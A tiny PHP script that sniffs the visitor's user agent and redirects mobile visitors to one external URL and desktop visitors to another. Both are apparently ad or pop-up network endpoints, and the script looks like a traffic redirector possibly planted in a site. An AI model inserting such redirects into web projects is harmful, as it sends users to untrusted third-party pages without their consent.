<?php

$es_movil = "0";
if (
    preg_match(
        "/(android|wap|phone|ipad)/i",
        strtolower($_SERVER["HTTP_USER_AGENT"])
    )
) {
    $es_movil++;
}
if ($es_movil > 0) {
    header("Location: http://prmobiles.com/imagenclick.com/c8ke/direct");
} else {
    header("Location: http://prpops.com/p/c8kd/direct");
}

?>